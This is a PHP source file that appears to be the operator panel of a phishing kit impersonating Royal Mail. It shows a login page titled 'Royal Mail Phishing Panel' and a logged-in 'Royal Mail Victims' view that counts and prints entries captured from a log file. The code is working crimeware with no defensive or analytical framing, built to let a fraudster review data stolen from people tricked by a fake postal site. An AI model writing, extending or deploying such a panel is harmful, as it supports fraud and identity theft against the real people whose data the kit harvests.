<?php
require 'config.php';

if (isset($_POST['username']) && isset($_POST['password'])) {
    if ($_POST['username'] === $admin_username && $_POST['password'] === $admin_password) {
        $_SESSION['authenticated'] = true;
    } else {
        $error = "Invalid credentials";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: admin.php");
    exit;
}

if (!is_logged_in()) {
?>
<!DOCTYPE html>
<html>
<head><title>Royal Mail Admin</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark text-white">
<div class="container mt-5">
    <div class="card mx-auto" style="max-width:400px;">
        <div class="card-header text-center bg-primary">Royal Mail Phishing Panel</div>
        <div class="card-body">
            <?php if(isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
            <form method="POST">
                <input type="text" name="username" class="form-control mb-3" placeholder="Username" required>
                <input type="password" name="password" class="form-control mb-3" placeholder="Password" required>
                <button type="submit" class="btn btn-success w-100">Login</button>
            </form>
        </div>
    </div>
</div>
</body>
</html>
<?php exit; } ?>

<!-- Logged-in Admin View -->
<!DOCTYPE html>
<html>
<head><title>Royal Mail - Victims</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container-fluid mt-3">
    <div class="d-flex justify-content-between">
        <h2>Royal Mail Victims (<?php echo count(file($log_file)); ?> captured)</h2>
        <a href="?logout=1" class="btn btn-danger">Logout</a>
    </div>
    <pre class="bg-light p-4 border"><?php echo htmlspecialchars(file_get_contents($log_file)); ?></pre>
</div>
</body>
</html>